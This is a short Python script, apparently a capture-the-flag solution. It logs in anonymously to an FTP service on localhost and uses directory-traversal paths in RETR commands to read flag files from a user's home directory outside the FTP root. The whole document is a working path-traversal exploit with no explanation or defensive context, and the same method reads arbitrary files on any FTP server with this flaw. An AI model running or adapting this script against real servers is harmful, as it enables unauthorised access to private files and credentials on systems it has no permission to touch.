#!/usr/bin/env python3
from ftplib import FTP
from io import BytesIO

HOST = "127.0.0.1"
PORT = 10921

targets = [
    "../../../../home/jimbo/flag2.txt",
    "../../../../home/jimbo/flag.txt",
]

for t in targets:
    print(f"[+] RETR {t}")
    try:
        ftp = FTP()
        ftp.connect(HOST, PORT, timeout=10)
        ftp.login("anonymous", "anonymous")

        buf = BytesIO()
        ftp.retrbinary(f"RETR {t}", buf.write)
        ftp.quit()

        data = buf.getvalue().decode(errors="ignore").strip()
        print(f"    len={len(data)}")
        print(f"    data={data}")
    except Exception as e:
        print(f"    error={e!r}")
